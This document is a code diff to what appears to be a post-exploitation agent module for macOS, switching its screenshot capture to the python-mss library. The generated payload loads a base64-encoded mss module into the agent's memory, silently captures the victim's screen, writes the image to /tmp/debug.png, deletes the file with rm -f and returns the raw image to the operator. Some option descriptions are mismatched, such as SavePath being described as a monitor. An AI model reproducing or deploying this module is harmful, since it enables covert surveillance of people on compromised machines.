@@ -1,8 +1,5 @@
-from zlib_wrapper import compress
-import os
-from lib.common import helpers
-import hashlib
 import base64
+import os
 
 class Module:
 
@@ -11,13 +8,13 @@ class Module:
         # metadata info about the module, not modified during runtime
         self.info = {
             # name for the module that will appear in module menus
-            'Name': 'NativeScreenshot',
+            'Name': 'NativeScreenshotMSS',
 
             # list of one or more authors for the module
             'Author': ['@xorrior'],
 
             # more verbose multi-line description of the module
-            'Description': ('Takes a screenshot of an OSX desktop using the Python Quartz libraries and returns the data.'),
+            'Description': ('Takes a screenshot of an OSX desktop using the Python mss module. The python-mss module utilizes ctypes and the CoreFoundation library.'),
 
             # True if the module needs to run in the background
             'Background': False,
@@ -50,6 +47,18 @@ class Module:
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
+            },
+            'SavePath': {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Monitor to obtain a screenshot. 0 represents all.',
+                'Required'      :   True,
+                'Value'         :   '/tmp/debug.png'
+            },
+            'Monitor': {
+                # The 'Agent' option is the only one that MUST be in a module
+                'Description'   :   'Monitor to obtain a screenshot. -1 represents all.',
+                'Required'      :   True,
+                'Value'         :   '-1'
             }
         }
 
@@ -69,24 +78,32 @@ class Module:
                     self.options[option]['Value'] = value
 
     def generate(self, obfuscate=False, obfuscationCommand=""):
-        script = """
-try:
-    import Quartz
-    import Quartz.CoreGraphics as CG
-    from AppKit import *
-    import binascii
-except ImportError:
-    print "Missing required module..."
 
-onScreenWindows = CG.CGWindowListCreate(CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID)
-desktopElements = Foundation.CFArrayCreateMutableCopy(None, 0, onScreenWindows)
-imageRef = CG.CGWindowListCreateImageFromArray(CG.CGRectInfinite, desktopElements, CG.kCGWindowListOptionAll)
-rep = NSBitmapImageRep.alloc().initWithCGImage_(imageRef)
-props = NSDictionary()
-imageData = rep.representationUsingType_properties_(NSPNGFileType,props)
-imageString = str(imageData).strip('<').strip('>>').strip('native-selector bytes of')
-hexstring = binascii.hexlify(imageString)
-hex_data = hexstring.decode('hex')
-print hex_data
-"""
+        path = self.mainMenu.installPath + "data/misc/python_modules/mss.zip"
+        filename = os.path.basename(path).rstrip('.zip')
+        open_file = open(path, 'rb')
+        module_data = open_file.read()
+        open_file.close()
+        module_data = base64.b64encode(module_data)
+        script = """
+import os
+import base64
+data = "%s"
+def run(data):
+    rawmodule = base64.b64decode(data)
+    zf = zipfile.ZipFile(io.BytesIO(rawmodule), "r")
+    if "mss" not in moduleRepo.keys():
+        moduleRepo["mss"] = zf
+        install_hook("mss")
+    
+    from mss import mss
+    m = mss()
+    file = m.shot(mon=%s,output='%s')
+    raw = open(file, 'rb').read()
+    run_command('rm -f %%s' %% (file))
+    print raw
+
+run(data)
+""" % (module_data, self.options['Monitor']['Value'], self.options['SavePath']['Value'])
+
         return script
